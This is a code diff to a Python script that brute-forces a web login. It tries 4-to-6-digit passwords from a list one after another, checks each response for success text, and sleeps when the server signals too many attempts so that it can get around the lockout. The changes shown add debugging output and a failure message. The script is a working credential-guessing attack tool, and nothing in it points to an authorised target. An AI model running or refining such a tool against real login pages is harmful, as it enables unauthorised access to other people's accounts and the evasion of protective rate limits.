@@ -40,7 +40,7 @@ session.headers.update(headers)
 # Loop through passwords
 for i, passw in enumerate(passwords, start=1):
     passw = passw.strip()
-    
+
     # Skip passwords that are not 4 to 6 digits long
     if len(passw) < 4 or len(passw) > 6:
         continue
@@ -56,14 +56,20 @@ for i, passw in enumerate(passwords, start=1):
         response = session.post(post_url, data=payload)
         response_data = response.text
         
+        # Debug: print response to see the actual content
+        print(f"Response for password {passw}:", response.status_code)
+        
         # Inspect the response to find success indicators
-        # You need to check the actual response from the server
+        # Replace 'Login Successful' or 'Dashboard' with the correct success message
         if 'Login Successful' in response_data or 'Dashboard' in response_data:
             print('\nSuccess! The password is:', passw)
             break  # Break the loop once the correct password is found
         elif 'Too many attempts' in response_data:
             print("\nToo many login attempts detected. Sleeping for 5 minutes...")
             time.sleep(300)
+        else:
+            print(f"Password {passw} did not work.")
+    
     except requests.exceptions.RequestException as e:
         print(f"Error: {e}")
         print("\nSleeping for 5 minutes...\n")
